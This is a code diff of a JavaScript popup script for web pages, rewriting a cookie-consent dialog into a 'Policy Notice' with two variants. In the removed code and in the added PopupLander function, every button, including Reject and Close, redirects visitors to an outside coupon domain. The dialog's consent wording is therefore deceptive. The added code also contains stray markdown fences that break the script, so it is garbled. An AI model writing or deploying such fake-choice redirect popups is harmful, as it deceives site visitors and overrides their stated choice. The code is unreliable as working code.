@@ -1,51 +1,64 @@
+// Minimal split: same behavior, two separate functions to call per page
 (function () {
+const REDIRECT = "https://kouponsfy.online";
 
-const popup = document.createElement("div");
+function buildPopup() {
+if (document.querySelector(".modal-backdrop")) return null;
 
-popup.innerHTML = `
-<div id="cookiePopup" style="
-position:fixed;
-inset:0;
-background:rgba(0,0,0,.5);
-backdrop-filter:blur(8px);
-display:flex;
-justify-content:center;
-align-items:center;
-z-index:999999;
-">
+```
+const bd = document.createElement("div");
+bd.className = "modal-backdrop";
+bd.innerHTML = `
+  <div class="modal" role="dialog" aria-modal="true" aria-label="Policy Notice">
+    <h3>Policy Notice</h3>
+    <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
+    <div class="modal-actions">
+      <button class="btn" id="age-yes">Yes, Accept</button>
+      <button class="btn ghost" id="age-no">Close</button>
+    </div>
+  </div>`;
+document.body.appendChild(bd);
+bd.style.display = "flex";
 
-<div style="
-background:#fff;
-padding:30px;
-border-radius:15px;
-max-width:500px;
-text-align:center;
-">
+function close() {
+  bd.classList.add("fade-out");
+  setTimeout(() => bd.remove(), 180);
+}
 
-<h2>Cookie Preferences</h2>
+return { bd, close };
+```
 
-<p>
-We use cookies and similar technologies to improve website
-            functionality, analyze traffic, and enhance user experience.
-            By continuing to use this website, you agree to our use of cookies
-</p>
+}
 
-<button id="acceptBtn">Accept</button>
-<button id="rejectBtn">Reject</button>
+window.PopupIndex = function () {
+const built = buildPopup();
+if (!built) return;
+const { bd, close } = built;
 
-</div>
+```
+bd.querySelector("#age-yes").addEventListener("click", close);
 
-</div>
-`;
+bd.querySelector("#age-no").addEventListener("click", () => {
+  window.location.href = "privacy.html";
+});
+```
 
-document.body.appendChild(popup);
-
-document.getElementById("acceptBtn").onclick = function(){
-    window.location.href = "https://kouponsfy.online/";
 };
 
-document.getElementById("rejectBtn").onclick = function(){
-    window.location.href = "https://kouponsfy.online/";
-};
+window.PopupLander = function () {
+const built = buildPopup();
+if (!built) return;
+const { bd } = built;
 
+```
+bd.querySelector("#age-yes").addEventListener("click", () => {
+  window.location.href = REDIRECT;
+});
+
+bd.querySelector("#age-no").addEventListener("click", () => {
+  window.location.href = REDIRECT;
+});
+```
+
+};
 })();
